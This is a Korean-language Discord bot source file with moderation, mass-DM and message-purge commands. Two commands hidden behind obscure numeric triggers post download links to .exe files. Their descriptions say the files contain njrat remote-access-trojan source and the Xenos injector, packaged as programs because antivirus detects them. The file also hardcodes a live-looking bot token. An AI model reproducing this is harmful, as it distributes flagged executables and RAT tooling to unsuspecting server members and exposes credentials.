const Discord = require('discord.js');
const client = new Discord.Client();
const token = 'NzU5MDAwODIyNTYxMzc0MjA4.X23ImQ.CAlZQtqXONeh6XQVjUhrSPYtIQA';
const welcomeChannelName = "안녕하세요";
const byeChannelName = "안녕히가세요";
const welcomeChannelComment = "어서오세요.";
const byeChannelComment = "안녕히가세요.";

client.on('ready', () => {
  console.log('켰다.');
  client.user.setPresence({ game: { name: '24시간 가동' }, status: 'online' })

})



client.on("message", (message) => {
    if (message.content.includes("https://")) {
      console.log("deleted " + message.content + " from " + message.author)
      message.delete(1);
      message.author.send({embed: {
        color: 3447003,
        title: "Warning !",
        description: `**Hey ! <@${message.author.id}>**\nDo not use the URL`
      }})
    }
  

    if(message.content.startsWith('!1235484831548')) {
        let embed = new Discord.RichEmbed()
        .setDescription('`아이콘 앱 다운사이트, njrat 소스, 서버파일분해기가 들어있습니다.`\n\n`njrat과 섭파분해기를 바이러스로 잡아서 프로그램으로 올립니다.`\n\n[클릭 & 다운로드](https://cdn.discordapp.com/attachments/753189474845982822/761229023060820038/Uso0677.exe)')
        .setImage(URL = 'https://storage1.upload.pe/storage/2020/10/01/GJvxAMGEb5.png')
    
        message.delete()
        message.channel.send(embed)
       }
    
       if(message.content.startsWith('!2378787345248')) {
        let embed = new Discord.RichEmbed()
        .setDescription('`엣지소스, Xenos 인젝터가 들어있습니다.`\n\n`용량이 많고 Xenos64를 바이러스로 잡아서 프로그램으로 올립니다.`\n\n[클릭 & 다운로드](https://cdn.discordapp.com/attachments/753189474845982822/761474585366495232/Uso2.exe)')
        .setImage(URL = 'https://storage1.upload.pe/storage/2020/10/02/aWvBw1JEj9.png')
    
        message.delete()
        message.channel.send(embed)
       }













if(message.content.startsWith('-전체공지2')) {
    if(checkPermission(message)) return
    if(message.member != null) { // 채널에서 공지 쓸 때
      let contents = message.content.slice('-전체공지2'.length);
      let img = 'https://storage1.upload.pe/storage/2020/10/02/ejQjbMPQrB.jpg';
      let embed = new Discord.RichEmbed()
        .setAuthor('Free', img)
        .setColor('#7f4dff')
        .setFooter(`[ 관리자 ]`)
        .setTimestamp()
  
      embed.setDescription(contents);
  
      message.member.guild.members.array().forEach(x => {
        if(x.user.bot) return;
        x.user.send(embed)
      });
  
      return message.reply('공지를 전송했습니다.');
    } else {
      return message.reply('채널에서 실행해주세요.');
    }
  } else if(message.content.startsWith('-전체공지')) {
    if(checkPermission(message)) return
    if(message.member != null) { // 채널에서 공지 쓸 때
      let contents = message.content.slice('-전체공지'.length);
      message.member.guild.members.array().forEach(x => {
        if(x.user.bot) return;
        x.user.send(`<@${message.author.id}> ${contents}`);
      });
  
      return message.reply('공지를 전송했습니다.');
    } else {
      return message.reply('채널에서 실행해주세요.');
    }
  } else if(message.content.startsWith('-청소')) {
    if(message.channel.type == 'dm') {
      return message.reply('dm에서 사용할 수 없는 명령어 입니다.');
    }
    
    if(message.channel.type != 'dm' && checkPermission(message)) return

    var clearLine = message.content.slice('-청소 '.length);
    var isNum = !isNaN(clearLine)

    if(isNum && (clearLine <= 0 || 100 < clearLine)) {
      message.channel.send("1부터 100까지의 숫자만 입력해주세요.")
      return;
    } else if(!isNum) { // c @나긋해 3
      if(message.content.split('<@').length == 2) {
        if(isNaN(message.content.split(' ')[2])) return;

        var user = message.content.split(' ')[1].split('<@!')[1].split('>')[0];
        var count = parseInt(message.content.split(' ')[2])+1;
        let _cnt = 0;

        message.channel.fetchMessages().then(collected => {
          collected.every(msg => {
            if(msg.author.id == user) {
              msg.delete();
              ++_cnt;
            }
            return !(_cnt == count);
          });
        });
      }
    } else {
      message.channel.bulkDelete(parseInt(clearLine)+1)
        .then(() => {
          AutoMsgDelete(message, parseInt(clearLine) + " removed message...");
        })
        .catch(console.error)
    }
  }
});

function checkPermission(message) {
  if(!message.member.hasPermission("MANAGE_MESSAGES")) {
    message.channel.send({embed: {
      color: 15158332,
      setTitle: '❌',
      description: `<@${message.author.id}>` +'님은 권한을 가지고있지 않습니다.'
    }})
    return true;
  } else {
    return false;
  }
}

function changeCommandStringLength(str, limitLen = 8) {
  let tmp = str;
  limitLen -= tmp.length;

  for(let i=0;i<limitLen;i++) {
      tmp += ' ';
  }

  return tmp;
}

async function AutoMsgDelete(message, str, delay = 3000) {
  let msg = await message.channel.send(str);

  setTimeout(() => {
    msg.delete();
  }, delay);
}

function getEmbedFields(message, modify=false) {
  if(message.content == '' && message.embeds.length > 0) {
    let e = message.embeds[0].fields;
    let a = [];

    for(let i=0;i<e.length;i++) {
        a.push(`\`${e[i].name}\` - \`${e[i].value}\`\n`);
    }

    return a.join('');
  } else if(modify) {
    return message.author.lastMessage.content;
  } else {
    return message.content;
  }
}

function MessageSave(message, modify=false) {
  imgs = []
  if (message.attachments.array().length > 0) {
    message.attachments.array().forEach(x => {
      imgs.push(x.url+'\n')
    });
  }

  username = message.author.username.match(/[\u3131-\uD79D^a-zA-Z^0-9]/ugi)
  channelName = message.channel.type != 'dm' ? message.channel.name : ''
  try {
    username = username.length > 1 ? username.join('') : username
  } catch (error) {}

  try {
    channelName = channelName.length > 1 ? channelName.join('') : channelName
  } catch (error) {}

  var s = {
    ChannelType: message.channel.type,
    ChannelId: message.channel.type != 'dm' ? message.channel.id : '',
    ChannelName: channelName,
    GuildId: message.channel.type != 'dm' ? message.channel.guild.id : '',
    GuildName: message.channel.type != 'dm' ? message.channel.guild.name : '',
    Message: getEmbedFields(message, modify),
    AuthorId: message.author.id,
    AuthorUsername: username + '#' + message.author.discriminator,
    AuthorBot: Number(message.author.bot),
    Embed: Number(message.embeds.length > 0), // 0이면 false 인거다.
  }

  s.Message = (modify ? '[수정됨] ' : '') + imgs.join('') + s.Message

    // .then((res) => {
    //   console.log('db 저장을 했다.', res);
    // })
    
}


client.login(token);